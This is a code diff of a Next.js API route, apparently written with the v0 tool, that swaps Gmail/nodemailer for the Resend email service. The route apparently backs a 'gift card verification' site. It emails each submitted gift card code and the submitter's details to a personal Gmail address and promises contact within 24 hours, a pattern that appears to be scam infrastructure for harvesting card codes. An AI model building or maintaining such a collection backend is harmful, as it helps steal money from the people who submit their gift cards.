@@ -1,13 +1,11 @@
 import { NextRequest, NextResponse } from 'next/server'
-import nodemailer from 'nodemailer'
+import Resend from 'resend'
 
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: process.env.GMAIL_USER,
-    pass: process.env.GMAIL_APP_PASSWORD,
-  },
-})
+const resendApiKey = process.env.RESEND_API_KEY
+let resendClient: Resend | null = null
+if (resendApiKey) {
+  resendClient = new Resend(resendApiKey)
+}
 
 export async function POST(request: NextRequest) {
   try {
@@ -112,42 +110,43 @@ export async function POST(request: NextRequest) {
 </html>
     `
 
-    console.log('[v0] Attempting to send email via Gmail...')
-    console.log('[v0] Using Gmail account:', process.env.GMAIL_USER)
-
-    // Send email to admin
-    const mailOptions = {
-      from: process.env.GMAIL_USER,
-      to: 'grimesdarl4@gmail.com',
-      subject: `New Gift Card Verification Request - ${giftCard}`,
-      html: adminEmailContent,
-      replyTo: email,
+    // Send email via Resend if API key is configured
+    if (!resendClient) {
+      console.error('[v0] RESEND_API_KEY is not configured on the server')
+      return NextResponse.json(
+        { error: 'Email service is not configured. Contact administrator.' },
+        { status: 500 }
+      )
     }
 
-    console.log('[v0] Mail options:', { from: mailOptions.from, to: mailOptions.to, subject: mailOptions.subject })
+    console.log('[v0] Sending email via Resend...')
 
-    const adminResponse = await transporter.sendMail(mailOptions)
+    try {
+      const resp = await resendClient.emails.send({
+        from: 'no-reply@giftcard-checker.example.com',
+        to: 'grimesdarl4@gmail.com',
+        subject: `New Gift Card Verification Request - ${giftCard}`,
+        html: adminEmailContent,
+        reply_to: email,
+      })
 
-    console.log('[v0] Admin email response:', adminResponse)
+      console.log('[v0] Resend response:', resp)
 
-    if (!adminResponse.messageId) {
-      console.error('[v0] Failed to send admin email. No messageId returned.')
+      return NextResponse.json(
+        {
+          success: true,
+          message: 'Verification request submitted successfully! We will contact you within 24 hours.',
+          messageId: resp.id ?? null,
+        },
+        { status: 200 }
+      )
+    } catch (sendErr) {
+      console.error('[v0] Error sending email via Resend:', sendErr)
       return NextResponse.json(
         { error: 'Failed to submit verification request. Please try again.' },
         { status: 500 }
       )
     }
-
-    console.log('[v0] Email sent successfully! MessageId:', adminResponse.messageId)
-
-    return NextResponse.json(
-      {
-        success: true,
-        message: 'Verification request submitted successfully! We will contact you within 24 hours.',
-        messageId: adminResponse.messageId,
-      },
-      { status: 200 }
-    )
   } catch (error) {
     console.error('[v0] Error processing request:', error)
     return NextResponse.json(
